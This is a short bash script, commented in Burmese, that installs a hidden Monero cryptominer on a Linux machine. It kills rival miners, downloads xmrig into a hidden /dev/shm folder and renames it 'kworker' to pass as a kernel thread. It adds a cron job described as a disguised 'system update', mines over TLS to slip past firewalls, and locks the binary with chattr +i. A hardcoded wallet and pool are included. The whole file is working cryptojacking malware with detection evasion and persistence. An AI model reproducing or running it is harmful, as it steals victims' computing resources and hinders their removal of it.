#!/bin/bash

# --- CONFIG ---
W="45cV4VxfBgeTzXeU4YoWQUQtjkugAuwqXVXpJmiMExRsYutqBa5RAEg6ZtPWpY7vVQ3tULGBszh1h1CLsAz1sqoXExNykBL"
P="gulf.moneroocean.stream:443"
N="HB_FUD_$(shuf -i 10-99 -n 1)" # နာမည်ကို random ပေးပြီး firewall ရှောင်မယ်
D="/dev/shm/.cache_$(date +%s)"
B="$D/kworker"

# --- THE CLEANUP ---
# အရင်က တက်မလာတဲ့ miner အဟောင်းတွေကို အကုန်သတ်
pkill -9 -f "javae|node-f|xmrig|miner|kernel"
rm -rf /dev/shm/.sys_update 2>/dev/null

# --- STEALTH SETUP ---
mkdir -p $D
cd $D

# --- STATIC BINARY DOWNLOAD (FUD) ---
# Static-linked binary ဖြစ်လို့ library error မတက်တော့ဘူး
curl -s -L https://github.com/moneroocean/xmrig_setup/raw/master/xmrig.tar.gz | tar -xz
mv xmrig kworker
chmod +x kworker

# --- PERSISTENCE (HIDDEN) ---
# Crontab ထဲမှာ "system update" လိုမျိုး ဟန်ဆောင်ပြီး ထည့်မယ်
(crontab -l 2>/dev/null | grep -v "kworker"; echo "*/5 * * * * $B --url $P --user $W --pass $N --tls -B >/dev/null 2>&1") | crontab -

# --- EXECUTE ---
# TLS encrypt လုပ်ထားလို့ firewall က mining traffic မှန်းမသိတော့ဘူး
./kworker --url $P --user $W --pass $N --tls -B >/dev/null 2>&1

# --- LOCKDOWN ---
chattr +i $B 2>/dev/null
